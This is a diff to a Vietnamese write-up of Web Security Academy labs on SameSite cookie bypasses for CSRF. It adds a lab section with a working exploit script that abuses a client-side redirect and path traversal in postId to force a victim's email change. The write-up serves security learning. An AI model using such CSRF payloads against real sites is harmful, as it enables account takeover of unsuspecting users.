@@ -249,7 +249,7 @@ Set-Cookie: csrf=xnxx; SameSite=None; Secure; HttpOnly
 #### Determine type of **SameSite**
 - Login bằng tài khoản được cấp
 - Thực hiện **change-email**
-- Quan sát các response, nhận thấy được không có SameSite nào được server chỉ định 
+- Quan sát các response, nhận thấy không có SameSite nào được server chỉ định 
 => SameSite Lax được sử dụng mặc định bởi **Chrome**
 
 #### Exploit
@@ -266,8 +266,47 @@ Host: 0a4d00ba046d90da817a8e1300b0005c.web-security-academy.net
 </script>
 ```
 - Deliver to victim
+
 > Tham số _method sẽ **chỉ có hiệu lực nếu phía server (framework) hỗ trợ và xử lý nó. 
-{: .promt-info}
+{: .prompt-info }
+
+### Lab: SameSite Strict bypass via client-side redirect
+#### Determine type of **SameSite**
+- Login bằng tài khoản được cấp
+- Thực hiện **change-email**
+- Quan sát các response, nhận thấy `SameSite=Strict` được set trong response
+
+#### Determine redirect location
+- Post 1 comment, trang web sẽ redirect sau vài giây(s)
+```html
+<script>redirectOnConfirmation('/post');</script>
+```
+- Mã nguồn redirect:
+```js
+redirectOnConfirmation = (blogPath) => {
+    setTimeout(() => {
+        const url = new URL(window.location);
+        const postId = url.searchParams.get("postId");
+        window.location = blogPath + '/' + postId;
+    }, 3000);
+}
+```
+
+- Trang web sẽ redirect đến post có id là `postId` sau khi comment
+- Lợi dụng điều này để thực hiện điều hướng bằng `traversal sequences(../)`
+- Thử truy cập `/post/comment/confirmation?postId=../../my-account` => thực sự redirect đến
+
+#### Exploit
+- Tạo mã khai thác
+```html
+<script>
+    document.location = "https://0a22006603294d068041e9f900eb00a8.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=abc%40gmail.com%26submit=1";
+</script>
+```
+- Vì sao phải URL-encode dấu & thành %26
+    - Phần khai thác ở trên đang nằm trong giá trị của query param postId.
+    - Nếu bạn để &submit=1 trần, trình duyệt sẽ hiểu đó là một tham số mới của request gốc (confirmation?postId=...&submit=1), không phải phần đuôi của đường dẫn sau khi “trườn” ra ngoài.
+    - Encode & thành %26 để nó được truyền nguyên vẹn vào URL đích sau khi “chạy lùi”.
 
 
 ## Prevent
